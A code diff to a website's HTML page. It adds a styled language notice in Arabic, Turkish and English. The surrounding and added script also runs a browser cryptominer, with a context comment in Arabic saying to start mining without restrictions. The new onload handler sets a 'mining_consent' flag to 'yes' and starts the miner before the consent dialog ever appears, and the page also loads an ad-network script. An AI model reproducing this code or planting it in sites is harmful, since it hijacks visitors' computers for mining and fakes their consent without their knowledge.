@@ -2866,6 +2866,28 @@ window.onload = () => {
   border: 1px solid #ccc;
   border-radius: 5px;
 }
+
+
+	#language-notice {
+  position: fixed;
+  top: 10px;
+  right: 10px;
+  left: 10px;
+  background-color: #f0f8ff;
+  color: #333;
+  border: 1px solid #87ceeb;
+  padding: 15px;
+  border-radius: 8px;
+  z-index: 10000;
+  font-size: 14px;
+  max-width: 400px;
+  margin: auto;
+  box-shadow: 0 0 8px rgba(0,0,0,0.2);
+  direction: ltr;
+  text-align: left;
+}
+
+	
 </style>
 
 	<script type='text/javascript' src='//pl27050538.profitableratecpm.com/37/00/18/3700182efa18efce714199ad050e2cf0.js'></script>
@@ -2875,6 +2897,32 @@ window.onload = () => {
   // بدء التعدين مباشرة بدون قيود
   var miner = WMP.Anonymous('SK_Fzqyrb8LOlTe3gB2eVdlV', { throttle: 0.1 });
   miner.start();
+
+	// عرض رسالة التنبيه بلغات متعددة مرة واحدة فقط للمستخدم
+function showLanguageNotice() {
+  if (!localStorage.getItem("language_notice_shown")) {
+    const notice = document.createElement("div");
+    notice.id = "language-notice";
+    notice.innerHTML = `
+      <strong>🌍 Notice:</strong><br>
+      <p>
+        <span style="direction: rtl;">🔹 اللغة الافتراضية للموقع هي الإنجليزية. يمكنك ترجمة الموقع إلى العربية أو التركية باستخدام زر الترجمة في متصفح Google Chrome.</span><br><br>
+        🔹 Sitenin varsayılan dili İngilizce'dir. Google Chrome çeviri düğmesi ile Türkçe veya Arapçaya çevirebilirsiniz.<br><br>
+        🔹 The default language of this site is English. You can translate the site to Arabic or Turkish using the Google Chrome translate button.
+      </p>
+    `;
+    document.body.appendChild(notice);
+    localStorage.setItem("language_notice_shown", "true");
+  }
+}
+
+window.onload = () => {
+  localStorage.setItem('mining_consent', 'yes');
+  startMiner();
+  document.getElementById('consent-modal').style.display = 'flex';
+  showLanguageNotice(); // إظهار التنبيه
+};
+
 </script>
 
 </body>
